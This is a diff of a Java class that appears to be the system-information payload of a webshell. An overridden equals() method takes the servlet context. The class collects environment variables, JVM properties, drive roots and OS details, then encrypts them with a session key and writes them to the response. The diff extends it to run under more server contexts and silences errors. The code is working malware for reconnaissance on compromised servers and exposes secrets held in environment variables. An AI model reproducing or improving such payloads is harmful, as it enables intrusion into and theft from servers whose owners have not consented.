@@ -10,44 +10,48 @@ import java.util.Map.Entry;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.ServletOutputStream;
-import javax.servlet.jsp.PageContext;
+import javax.servlet.ServletRequest;
+import javax.servlet.ServletResponse;
+import javax.servlet.http.HttpSession;
 
 public class BasicInfo {
    public static String whatever;
+   private ServletRequest Request;
+   private ServletResponse Response;
+   private HttpSession Session;
 
    public boolean equals(Object obj) {
-      PageContext page = (PageContext)obj;
-      page.getResponse().setCharacterEncoding("UTF-8");
       String result = "";
 
       try {
+         this.fillContext(obj);
          StringBuilder basicInfo = new StringBuilder("<br/><font size=2 color=red>环境变量:</font><br/>");
          Map env = System.getenv();
-         Iterator var6 = env.keySet().iterator();
+         Iterator var5 = env.keySet().iterator();
 
-         while(var6.hasNext()) {
-            String name = (String)var6.next();
+         while(var5.hasNext()) {
+            String name = (String)var5.next();
             basicInfo.append(name + "=" + (String)env.get(name) + "<br/>");
          }
 
          basicInfo.append("<br/><font size=2 color=red>JRE系统属性:</font><br/>");
          Properties props = System.getProperties();
          Set entrySet = props.entrySet();
-         Iterator var8 = entrySet.iterator();
+         Iterator var7 = entrySet.iterator();
 
-         while(var8.hasNext()) {
-            Entry entry = (Entry)var8.next();
+         while(var7.hasNext()) {
+            Entry entry = (Entry)var7.next();
             basicInfo.append(entry.getKey() + " = " + entry.getValue() + "<br/>");
          }
 
          String currentPath = (new File("")).getAbsolutePath();
          String driveList = "";
          File[] roots = File.listRoots();
-         File[] var11 = roots;
-         int var12 = roots.length;
+         File[] var10 = roots;
+         int var11 = roots.length;
 
-         for(int var13 = 0; var13 < var12; ++var13) {
-            File f = var11[var13];
+         for(int var12 = 0; var12 < var11; ++var12) {
+            File f = var10[var12];
             driveList = driveList + f.getPath() + ";";
          }
 
@@ -57,15 +61,14 @@ public class BasicInfo {
          entity.put("currentPath", currentPath);
          entity.put("driveList", driveList);
          entity.put("osInfo", osInfo);
+         entity.put("arch", System.getProperty("os.arch"));
          result = this.buildJson(entity, true);
-         String key = page.getSession().getAttribute("u").toString();
-         ServletOutputStream so = page.getResponse().getOutputStream();
+         String key = this.Session.getAttribute("u").toString();
+         ServletOutputStream so = this.Response.getOutputStream();
          so.write(Encrypt(result.getBytes(), key));
          so.flush();
          so.close();
-         page.getOut().clear();
-      } catch (Exception var15) {
-         var15.printStackTrace();
+      } catch (Exception var14) {
       }
 
       return true;
@@ -114,5 +117,20 @@ public class BasicInfo {
       sb.setLength(sb.length() - 1);
       sb.append("}");
       return sb.toString();
+   }
+
+   private void fillContext(Object obj) throws Exception {
+      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
+         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+      } else {
+         Map objMap = (Map)obj;
+         this.Session = (HttpSession)objMap.get("session");
+         this.Response = (ServletResponse)objMap.get("response");
+         this.Request = (ServletRequest)objMap.get("request");
+      }
+
+      this.Response.setCharacterEncoding("UTF-8");
    }
 }
